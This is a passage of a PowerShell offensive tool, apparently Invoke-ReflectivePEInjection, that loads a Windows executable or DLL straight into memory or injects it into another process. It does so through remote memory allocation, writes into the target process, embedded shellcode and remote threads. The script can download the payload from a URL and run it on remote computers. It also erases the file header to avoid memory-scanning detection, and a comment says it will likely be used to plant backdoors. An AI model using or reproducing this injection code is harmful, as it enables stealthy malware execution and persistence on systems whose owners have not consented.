            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	if ($PsCmdlet.ParameterSetName -ieq "LocalFile")
	{
		Get-ChildItem $PEPath -ErrorAction Stop | Out-Null
		[Byte[]]$PEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $PEPath))
	}
	elseif ($PsCmdlet.ParameterSetName -ieq "WebFile")
	{
		$WebClient = New-Object System.Net.WebClient
		
		[Byte[]]$PEBytes = $WebClient.DownloadData($PEUrl)
	}
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
	# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
    $PEBytes[0] = 0
    $PEBytes[1] = 0
	
	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}

#$PEBytes = [System.Convert]::FromBase64String($InputString)
#Invoke-ReflectivePEInjection -PEBytes $PEBytes

